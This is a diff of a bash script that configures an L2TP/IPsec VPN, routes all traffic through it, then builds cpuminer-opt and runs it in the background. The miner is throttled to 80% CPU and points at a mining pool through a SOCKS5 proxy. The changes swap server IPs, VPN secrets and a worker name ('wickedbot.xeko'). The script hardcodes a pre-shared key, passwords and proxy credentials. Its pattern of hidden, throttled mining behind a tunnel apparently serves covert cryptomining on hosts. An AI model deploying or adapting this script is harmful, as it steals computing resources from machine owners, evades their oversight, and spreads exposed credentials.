@@ -1,10 +1,10 @@
 #!/bin/bash
 apt-get update
 apt-get -y install strongswan xl2tpd
-VPN_SERVER_IP='128.199.64.79'
-VPN_IPSEC_PSK='PpsNENL8SusjHxNM'
+VPN_SERVER_IP='139.59.231.98'
+VPN_IPSEC_PSK='NJuW586RyvjF8b5M'
 VPN_USER='vpnuser'
-VPN_PASSWORD='2ieYwg33AN5vsRfp'
+VPN_PASSWORD='f7yzjHb5ubHuH6Jh'
 cat > /etc/ipsec.conf <<EOF
 # ipsec.conf - strongSwan IPsec configuration file
 
@@ -81,7 +81,7 @@ sleep 5s
 echo "c myvpn" > /var/run/xl2tpd/l2tp-control
 sleep 5s
 IP=$(/sbin/ip route | awk '/default/ { print $3 }')
-route add 128.199.64.79 gw $IP
+route add 139.59.231.98 gw $IP
 route add 1.54.18.103 gw $IP
 route add 27.73.38.94 gw $IP
 route add default dev ppp0
@@ -93,4 +93,4 @@ cd cpuminer-opt
 chmod +x *
 ./build.sh
 make
-cpulimit --exe cpuminer --limit 80 -b && ./cpuminer -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u wickedbot.xeko -p x -x socks5://zimbalem:123456@209.250.244.28:1212 --background
+cpulimit --exe cpuminer --limit 80 -b && ./cpuminer -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u zimbalem.test -p x -x socks5://zimbalem:123456@209.250.244.28:1212 --background
